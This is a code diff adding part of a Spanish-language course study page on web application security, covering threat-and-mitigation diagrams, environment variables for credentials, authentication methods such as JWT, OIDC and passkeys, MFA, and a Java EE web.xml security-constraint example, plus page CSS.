+      <text x="570" y="235" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-tip-text)">Mitigación</text>
+      <text x="570" y="251" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">PreparedStatement (visto en JDBC)</text>
+
+      <!-- Base de datos -->
+      <rect x="10"  y="270" width="160" height="60" rx="4" fill="var(--color-surface-2)" stroke="var(--color-border)" stroke-width="1.5"/>
+      <text x="90"  y="290" text-anchor="middle" font-family="var(--font-display)" font-size="10" font-weight="600" fill="var(--color-text)">Base de datos</text>
+      <text x="90"  y="306" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-text-2)">MySQL / PostgreSQL</text>
+      <rect x="180" y="270" width="240" height="60" rx="4" fill="oklch(97% 0.03 20 / 0.3)" stroke="var(--color-warning-border)" stroke-width="1"/>
+      <text x="300" y="290" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-warning-text)">Amenaza</text>
+      <text x="300" y="306" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">Acceso externo directo,</text>
+      <text x="300" y="320" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-warning-text)">usuario con exceso de privilegios</text>
+      <rect x="430" y="270" width="280" height="60" rx="4" fill="var(--color-tip-bg)" stroke="var(--color-tip-border)" stroke-width="1"/>
+      <text x="570" y="290" text-anchor="middle" font-family="var(--font-display)" font-size="9"  fill="var(--color-tip-text)">Mitigación</text>
+      <text x="570" y="306" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">Restricción de IP,</text>
+      <text x="570" y="320" text-anchor="middle" font-family="var(--font-body)"    font-size="9"  fill="var(--color-tip-text)">usuarios BD con privilegios mínimos</text>
+    </svg>
+
+    <h3>Variables de entorno</h3>
+
+    <p>Las credenciales (contraseñas de BD, claves de API) en ficheros de propiedades del repositorio son un riesgo: el equipo de desarrollo puede ver la contraseña de producción. La práctica recomendada (codificada en <em>The Twelve-Factor App</em>) es definirlas como variables de entorno del servidor: solo el administrador puede verlas, son fáciles de cambiar sin recompilar, y no pueden aparecer en un commit accidental.</p>
+
+    <div class="callout callout-tip">
+      <p>Un patrón útil en la BD: usar diferentes usuarios de BD según el rol de la operación. Un usuario de solo lectura para el catálogo público; un usuario con permisos de escritura limitados para las operaciones de cliente; otro de administración. Si una capa se ve comprometida, el daño queda contenido.</p>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 7: MÉTODOS DE AUTENTICACIÓN ===== -->
+  <section id="metodos-autenticacion">
+    <h2>Panorama de métodos de autenticación</h2>
+
+    <div class="callout callout-examen">
+      <p>Peso bajo. Conocer los nombres y el propósito general de cada mecanismo. No memorizar detalles de protocolo. La autenticación basada en sesión (sección anterior) es la que entra; esta sección da contexto.</p>
+    </div>
+
+    <p>La autenticación basada en sesión con cookies es el mecanismo de las prácticas, pero el ecosistema de autenticación web es amplio. Los sistemas modernos usan frecuentemente alguna de estas alternativas.</p>
+
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Método</th>
+          <th>Cómo funciona</th>
+          <th>Casos de uso</th>
+          <th>Limitación principal</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Sesión + cookies</td>
+          <td>Login → sesión en servidor → cookie <code>sessionId</code> en navegador</td>
+          <td>Aplicaciones web tradicionales SSR (P5, P6)</td>
+          <td>Estado en servidor; problemas con escala horizontal y múltiples servidores</td>
+        </tr>
+        <tr>
+          <td>JWT (JSON Web Token)</td>
+          <td>Login → servidor emite token firmado → cliente lo envía en header <code>Authorization: Bearer &lt;token&gt;</code></td>
+          <td>APIs REST, SPAs, microservicios</td>
+          <td>Token no revocable fácilmente antes de su expiración</td>
+        </tr>
+        <tr>
+          <td>OAuth 2.0 / OpenID Connect</td>
+          <td>OAuth 2.0 es un protocolo de <strong>autorización</strong> (delegar acceso a recursos de terceros). OpenID Connect (OIDC) es la capa de <strong>autenticación</strong> construida sobre él: añade un <code>id_token</code> JWT que identifica al usuario. "Login con Google" es OIDC, no OAuth puro.</td>
+          <td>OIDC: "Login con Google/GitHub/Microsoft". OAuth 2.0 puro: que una app acceda a tu Google Calendar en tu nombre.</td>
+          <td>Dependencia del proveedor externo; flujo más complejo</td>
+        </tr>
+        <tr>
+          <td>SAML</td>
+          <td>Protocolo XML para SSO entre organizaciones</td>
+          <td>Entornos enterprise, federación de identidades universitarias</td>
+          <td>Complejidad; verbosidad XML</td>
+        </tr>
+        <tr>
+          <td>WebAuthn / Passkeys</td>
+          <td>Claves criptográficas generadas en el dispositivo; sin contraseña</td>
+          <td>FIDO2, autenticación biométrica moderna</td>
+          <td>Requiere soporte del dispositivo y navegador</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>MFA — Multi-Factor Authentication</h3>
+
+    <p>La autenticación multifactor añade un segundo factor a las credenciales tradicionales (algo que sabes). Los factores típicos: <strong>algo que tienes</strong> (OTP por SMS/email, aplicaciones como Google Authenticator o Authy, llaves físicas YubiKey) o <strong>algo que eres</strong> (biometría). En cualquier sistema real con datos sensibles, MFA es una práctica necesaria.</p>
+
+    <div class="callout callout-relation">
+      <p>Relación con JS+AJAX: cuando una API REST usa JWT en lugar de cookies, el token se envía en la cabecera <code>Authorization: Bearer &lt;token&gt;</code> desde JavaScript. En el bloque JS+AJAX se cubre cómo construir esa cabecera en <code>fetch()</code>.</p>
+    </div>
+  </section>
+
+  <!-- ===== SECCIÓN 8: SEGURIDAD DECLARATIVA ===== -->
+  <section id="seguridad-declarativa">
+    <h2>Seguridad declarativa en Java EE</h2>
+
+    <div class="callout callout-examen">
+      <p>Saltar. El profesor confirmó explícitamente que "Autenticación gestionada por el contenedor" y "Conexiones seguras (https)" NO ENTRAN en el examen. Incluido solo para completitud conceptual. No memorizar la configuración XML.</p>
+    </div>
+
+    <p>Java EE permite delegar al contenedor (Tomcat) la gestión de autenticación y autorización configurándolo declarativamente en <code>web.xml</code> y <code>context.xml</code>, sin escribir filtros a mano. Es el contrapunto al enfoque programático de P5.</p>
+
+    <table class="comparison-table">
+      <thead>
+        <tr>
+          <th>Aspecto</th>
+          <th>Programático (filtros a mano, P5)</th>
+          <th>Declarativo (container-managed, web.xml)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Control por URL</td>
+          <td>Total — lógica en código</td>
+          <td>Total — patrones en web.xml</td>
+        </tr>
+        <tr>
+          <td>Control por datos del usuario</td>
+          <td>Sí — lógica en controlador</td>
+          <td>No disponible</td>
+        </tr>
+        <tr>
+          <td>Flexibilidad</td>
+          <td>Máxima</td>
+          <td>Limitada a lo que el contenedor soporta</td>
+        </tr>
+        <tr>
+          <td>Código necesario</td>
+          <td>Filtros, servicios de login</td>
+          <td>Solo configuración XML</td>
+        </tr>
+        <tr>
+          <td>Portabilidad</td>
+          <td>Portable — lógica en la aplicación</td>
+          <td>Dependiente del servidor (Tomcat ≠ WildFly)</td>
+        </tr>
+        <tr>
+          <td>Complejidad</td>
+          <td>Media-alta</td>
+          <td>Baja para casos simples</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="code-block">
+      <div class="code-header">xml</div>
+<pre><code>&lt;!-- web.xml — proteger /admin/* para rol "administrador" con HTTPS --&gt;
+&lt;security-constraint&gt;
+  &lt;web-resource-collection&gt;
+    &lt;web-resource-name&gt;Area de administracion&lt;/web-resource-name&gt;
+    &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;
+    &lt;http-method&gt;GET&lt;/http-method&gt;
+    &lt;http-method&gt;POST&lt;/http-method&gt;
+  &lt;/web-resource-collection&gt;
+  &lt;auth-constraint&gt;
+    &lt;role-name&gt;administrador&lt;/role-name&gt;
+  &lt;/auth-constraint&gt;
+  &lt;user-data-constraint&gt;
+    &lt;!-- CONFIDENTIAL fuerza HTTPS automáticamente --&gt;
+    &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;
+  &lt;/user-data-constraint&gt;
+&lt;/security-constraint&gt;
+
+&lt;login-config&gt;
+  &lt;auth-method&gt;FORM&lt;/auth-method&gt;
+  &lt;form-login-config&gt;
+    &lt;form-login-page&gt;/login.html&lt;/form-login-page&gt;
+    &lt;form-error-page&gt;/errorLogin.jsp&lt;/form-error-page&gt;
+  &lt;/form-login-config&gt;
+&lt;/login-config&gt;
+&lt;!-- j_security_check procesa el login; j_username y j_password son campos obligatorios --&gt;</code></pre>
+    </div>
+
+    <div class="callout callout-tip">
+      <p>Un uso curioso de <code>security-constraint</code>: bloquear el acceso directo a vistas JSP poniendo <code>&lt;auth-constraint&gt;</code> vacío en <code>*.jsp</code>. Los forwards internos siguen funcionando; solo se bloquea el acceso desde la barra del navegador.</p>
+    </div>
+  </section>
+
 </BlockLayout>
+
+<style>
+  .lead {
+    font-family: var(--font-body);
+    font-size: var(--text-md);
+    color: var(--color-text-2);
+    line-height: var(--leading-normal);
+    margin-bottom: var(--space-7);
+    max-width: var(--measure);
+  }
+
+  section {
+    margin-bottom: var(--space-8);
+  }
+
+  h2 {
+    font-family: var(--font-display);
+    font-size: var(--text-xl);
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    line-height: var(--leading-tight);
+    color: var(--color-text);
+    margin-bottom: var(--space-5);
+    margin-top: var(--space-7);
+  }
+
+  h3 {
+    font-family: var(--font-display);
+    font-size: var(--text-lg);
+    font-weight: 600;
+    letter-spacing: -0.01em;
+    line-height: var(--leading-snug);
+    color: var(--color-text);
+    margin-top: var(--space-6);
+    margin-bottom: var(--space-4);
+  }
+
+  p {
+    font-family: var(--font-body);
+    font-size: var(--text-base);
+    line-height: var(--leading-normal);
+    color: var(--color-text);
+    max-width: var(--measure);
+    margin-bottom: var(--space-4);
+  }
+
+  ul {
+    font-family: var(--font-body);
+    font-size: var(--text-base);
+    line-height: var(--leading-normal);
+    color: var(--color-text);
+    max-width: var(--measure);
+    margin-bottom: var(--space-4);
+    padding-left: var(--space-5);
+  }
+
+  li {
+    margin-bottom: var(--space-2);
+  }
+
+  code {
+    font-family: var(--font-mono);
+    font-size: 0.9em;
+    background: var(--color-code-bg);
+    padding: 2px 5px;
+    border-radius: 3px;
+  }
+
+  .code-block {
+    border: 1px solid var(--color-code-border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin: var(--space-5) 0;
+    max-width: var(--measure-wide);
+  }
+
+  .code-header {
+    background: var(--color-surface-2);
+    padding: var(--space-2) var(--space-4);
+    font-family: var(--font-mono);
+    font-size: var(--text-sm);
+    color: var(--color-text-2);
+    border-bottom: 1px solid var(--color-code-border);
+  }
+
+  .code-block pre {
+    margin: 0;
+    padding: var(--space-4) var(--space-5);
+    overflow-x: auto;
+  }
+
+  .code-block code {
+    font-family: var(--font-mono);
+    font-size: var(--text-sm);
+    background: none;
+    padding: 0;
+    border-radius: 0;
+    color: var(--color-text);
+    line-height: var(--leading-normal);
+  }
+
+  .comparison-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: var(--text-sm);
+    font-family: var(--font-body);
+    margin: var(--space-5) 0;
+    max-width: var(--measure-wide);
+  }
+
+  .comparison-table th {
+    background: var(--color-surface-2);
+    padding: var(--space-3) var(--space-4);
+    text-align: left;
+    font-weight: 600;
+    font-family: var(--font-display);
+    border-bottom: 2px solid var(--color-border-strong);
+  }
+
+  .comparison-table td {
+    padding: var(--space-3) var(--space-4);
+    border-bottom: 1px solid var(--color-border);
+    vertical-align: top;
+  }
+
+  .comparison-table tr:last-child td {
+    border-bottom: none;
+  }
+
+  .callout {
+    padding: var(--space-4) var(--space-5);
+    border-radius: 6px;
+    border: 1px solid;
+    margin: var(--space-5) 0;
+    max-width: var(--measure);
+  }
+
+  .callout p {
+    margin: 0;
+    max-width: none;
+  }
+
+  .callout::before {
+    display: block;
+    font-size: var(--text-sm);
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    margin-bottom: var(--space-2);
+    font-family: var(--font-display);
+  }
+
+  .callout-examen {
+    background: var(--color-key-bg);
+    border-color: var(--color-key-border);
+    color: var(--color-key-text);
+  }
+  .callout-examen::before { content: "Relevancia en el examen"; }
+
+  .callout-key {
+    background: var(--color-key-bg);
+    border-color: var(--color-key-border);
+    color: var(--color-key-text);
+  }
+  .callout-key::before { content: "Concepto clave"; }
+
+  .callout-warning {
+    background: var(--color-warning-bg);
+    border-color: var(--color-warning-border);
+    color: var(--color-warning-text);
+  }
+  .callout-warning::before { content: "Advertencia"; }
+
+  .callout-tip {
+    background: var(--color-tip-bg);
+    border-color: var(--color-tip-border);
+    color: var(--color-tip-text);
+  }
+  .callout-tip::before { content: "Tip"; }
+
+  .callout-relation {
+    background: var(--color-relation-bg);
+    border-color: var(--color-relation-border);
+    color: var(--color-relation-text);
+  }
+  .callout-relation::before { content: "Relación con otro bloque"; }
+</style>
